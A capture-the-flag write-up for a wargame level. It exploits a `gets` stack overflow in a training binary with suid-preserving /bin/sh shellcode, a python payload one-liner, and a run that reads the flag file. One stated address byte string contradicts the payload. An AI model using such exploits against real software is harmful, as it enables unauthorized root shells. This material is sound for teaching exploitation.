## level00

level00 start with a case.c file and a case binary. Running the binary will print

```
  ╔══════════════════════════════════════╗
  ║   SPRAWL//NET Authentication v2.1   ║
  ║      Console cowboy detected.        ║
  ╚══════════════════════════════════════╝

[SPRAWL//NET] Session 0 initialized
[SPRAWL//NET] Enter credentials: 
```

It is asking for credentials, and we can see that the binary is using `gets` to read our input. Gets is a unsecure function that does not check the length of the input, so we can overflow the buffer and change the return address to point to our shellcode.

In order to calculate the offset of the return address of the we can use `gdb` to disassemble the `case` binary.
We're interested in the `auth_loop` function, since this contains the exploitable `gets` function.

```asm
(gdb) disas auth_loop
Dump of assembler code for function auth_loop:
   0x000000000040150c <+0>:	endbr64
   0x0000000000401510 <+4>:	push   %rbp
   0x0000000000401511 <+5>:	mov    %rsp,%rbp
   0x0000000000401514 <+8>:	sub    $0x50,%rsp
   0x0000000000401518 <+12>:	call   0x4012e4 <create_session>
   0x000000000040151d <+17>:	mov    %eax,-0x4(%rbp)
   0x0000000000401520 <+20>:	cmpl   $0x0,-0x4(%rbp)
   0x0000000000401524 <+24>:	jns    0x401553 <auth_loop+71>
   0x0000000000401526 <+26>:	mov    0x2b73(%rip),%rax        # 0x4040a0 <stderr@GLIBC_2.2.5>
   0x000000000040152d <+33>:	mov    %rax,%rcx
   0x0000000000401530 <+36>:	mov    $0x1a,%edx
   0x0000000000401535 <+41>:	mov    $0x1,%esi
   0x000000000040153a <+46>:	lea    0xc5f(%rip),%rax        # 0x4021a0
   0x0000000000401541 <+53>:	mov    %rax,%rdi
   0x0000000000401544 <+56>:	call   0x401190 <fwrite@plt>
   0x0000000000401549 <+61>:	mov    $0x1,%edi
   0x000000000040154e <+66>:	call   0x401180 <exit@plt>
   0x0000000000401553 <+71>:	mov    -0x4(%rbp),%eax
   0x0000000000401556 <+74>:	mov    %eax,%esi
   0x0000000000401558 <+76>:	lea    0xc61(%rip),%rax        # 0x4021c0
   0x000000000040155f <+83>:	mov    %rax,%rdi
   0x0000000000401562 <+86>:	mov    $0x0,%eax
   0x0000000000401567 <+91>:	call   0x401110 <printf@plt>
   0x000000000040156c <+96>:	lea    0xc75(%rip),%rax        # 0x4021e8
   0x0000000000401573 <+103>:	mov    %rax,%rdi
   0x0000000000401576 <+106>:	mov    $0x0,%eax
   0x000000000040157b <+111>:	call   0x401110 <printf@plt>
   0x0000000000401580 <+116>:	mov    0x2af9(%rip),%rax        # 0x404080 <stdout@GLIBC_2.2.5>
   0x0000000000401587 <+123>:	mov    %rax,%rdi
   0x000000000040158a <+126>:	call   0x401170 <fflush@plt>
   0x000000000040158f <+131>:	lea    -0x50(%rbp),%rax
   0x0000000000401593 <+135>:	mov    %rax,%rdi
   0x0000000000401596 <+138>:	call   0x401160 <gets@plt>

   ...
```

We can see that the offset given to `gets` is `%rbp` minus `0x50`, which translates to `80` in decimal.
We can calculate the offset of the `return address` of our `auth_loop` function now!

```
Higher Memory Addresses
+-----------------------+  <--- Offset = 96
|  Saved RIP            |  <--- The value we need to change
|  (Return Address)     |
+-----------------------+  <--- Offset = 88
|  Saved RBP            |
|  (Old Frame Pointer)  |
+-----------------------+  <--- Offset = 80
|                       |
|    Extra alignment    |  <--- Extra alignment caused by the "sub    $0x50,%rsp"
|       (12 bytes)      |         
|                       |
+-----------------------+  <-- Offset = 68
|                       |
|         sid           |
|                       |
+-----------------------+  <--- Offset = 64
|                       |
|   64 bytes buffer     |
|                       |
+-----------------------+  <--- Offset 0 (%rbp - 0x50) == %rsp
Lower Memory Addresses
```

Once we have the offset we need to see where we can store our shellcode. A suitable place is the buffer itself, it is on the stack and `stack execution` is enabled in this binary. With GDB we can find out the address of the start of the buffer.

`gdb` does mess with the stack addressed a bit since it adds extra environment variables (we figured out after only debugging for 7 hours...).
We can make sure to remove these added variables by running `gdb` through the following command:

```bash
gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "break auth_loop" -ex "run" case
```

Setting a breakpoint after the `sub` instruction that creates the address for our buffer we can see the following:

```bash
Breakpoint 1, 0x0000000000401514 in auth_loop ()
(gdb) b *0x0000000000401518
Breakpoint 2 at 0x401518
(gdb) c
Continuing.

Breakpoint 2, 0x0000000000401518 in auth_loop ()
(gdb) i r rsp 
rsp            0x7fffffffe0c0      0x7fffffffe0c0
```

Analyzing with GDB we can see that the buffer is located at `0x7fffffffe0c0`. We can use this address to point our return address to the start of the buffer where we will place our shellcode.

### The payload

The payload will consist of the following:
- shellcode in bytes
- filler bytes to fill the buffer and reach the return address
- the address of the buffer in reverse order (little Endian) to change the return address to point to our shellcode.

A nice starting point for creating shellcode is [this](https://www.usna.edu/Users/cs/choi/it432/lec/l12/lec.html) tutorial.
We had to make a couple changes to make ours work, specifically adding an extra `add $0x28, %rsp` to prevent our shellcode from erasing itself and adding a `-p` flag to the `/bin/sh` arguments to keep the `suid` permissions.
The translated [shellcode.c](./shellcode.c) executes the following c code:

```c
execve("/bin/sh", {"/bin/sh", "-p", NULL}, NULL);
```

Compiling our shell code and looking at the output of `objdump -D` we see the following:

```
48 83 c4 28             add    $0x28,%rsp
48 b8 11 11 11 11 11    movabs $0x1111111111111111,%rax
11 11 11 
49 bc 3e 73 78 7f 3e    movabs $0x1179623e7f78733e,%r12
62 79 11 
49 bd 3c 61 11 11 11    movabs $0x111111111111613c,%r13
11 11 11 
49 31 c4                xor    %rax,%r12
41 54                   push   %r12
49 89 e4                mov    %rsp,%r12
49 31 c5                xor    %rax,%r13
41 55                   push   %r13
49 89 e5                mov    %rsp,%r13
4c 89 e7                mov    %r12,%rdi
48 31 c0                xor    %rax,%rax
50                      push   %rax
41 55                   push   %r13
41 54                   push   %r12
48 89 e6                mov    %rsp,%rsi
48 31 d2                xor    %rdx,%rdx
b0 3b                   mov    $0x3b,%al
0f 05                   syscall
```

Converting these instructions into a string of bytes we get the first part of our payload:

```
"\x48\x83\xc4\x28\x48\xb8\x11\x11\x11\x11\x11\x11\x11\x11\x49\xbc\x3e\x73\x78\x7f\x3e\x62\x79\x11\x49\xbd\x3c\x61\x11\x11\x11\x11\x11\x11\x49\x31\xc4\x41\x54\x49\x89\xe4\x49\x31\xc5\x41\x55\x49\x89\xe5\x4c\x89\xe7\x48\x31\xc0\x50\x41\x55\x41\x54\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05"
```

The final part of the payload will be the address where our shellcode resides.
The address of the buffer containing it is `0x7fffffffe0c0` and we need to reverse it since or program runs in little Endian format. To write the individual bytes we can use this python string  `\xac\xe0\xff\xff\xff\x7f\x00\x00` to use it in our payload.

Last thing we need to do is figure out how many filler bytes we need after our shellcode and before the `return address`.
This shellcode is 71 bytes long, meaning we need an additional 17 bytes to reach our offset of 88 bytes.

To create our payload we'll be using `python`.
Putting all the pieces together:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'\x48\x83\xc4\x28\x48\xb8\x11\x11\x11\x11\x11\x11\x11\x11\x49\xbc\x3e\x73\x78\x7f\x3e\x62\x79\x11\x49\xbd\x3c\x61\x11\x11\x11\x11\x11\x11\x49\x31\xc4\x41\x54\x49\x89\xe4\x49\x31\xc5\x41\x55\x49\x89\xe5\x4c\x89\xe7\x48\x31\xc0\x50\x41\x55\x41\x54\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05' + b'\x01' * 17 + b'\xc0\xe0\xff\xff\xff\x7f\x00\x00')" > payload
```

## The exploit

Final part is keeping the shell open after starting it, if we were to simply call `cat payload | $PWD/case` the shell closes.
To keep it open we can pass an additional `-` along.
Also note that we call `case` with `$PWD` in front of it. Since `gdb` calls the program with its full path. We need to call `case` in the exact same way since the address of our buffer is located on the stack, and this can change depending on the size of `argv` and the `envp`.

```bash
level00@rainfall:~$ cat payload - | $PWD/case

  ╔══════════════════════════════════════╗
  ║   SPRAWL//NET Authentication v2.1   ║
  ║      Console cowboy detected.        ║
  ╚══════════════════════════════════════╝

[SPRAWL//NET] Session 0 initialized
[SPRAWL//NET] Enter credentials: 
[SPRAWL//NET] Access denied.
[SPRAWL//NET] Audit: [1786037705] user=H��(H�I�>sx>byI�<aI1�ATI��I1�AUI��L��H1�PAUATH��H1Ұ;����� status=FAIL

cat /home/flag00/.pass
czugaihitjx0lys47blkh0qwtzz1c9g6
```

Gaining shell access and reading the `.pass` file we get our very first flag: `czugaihitjx0lys47blkh0qwtzz1c9g6`!
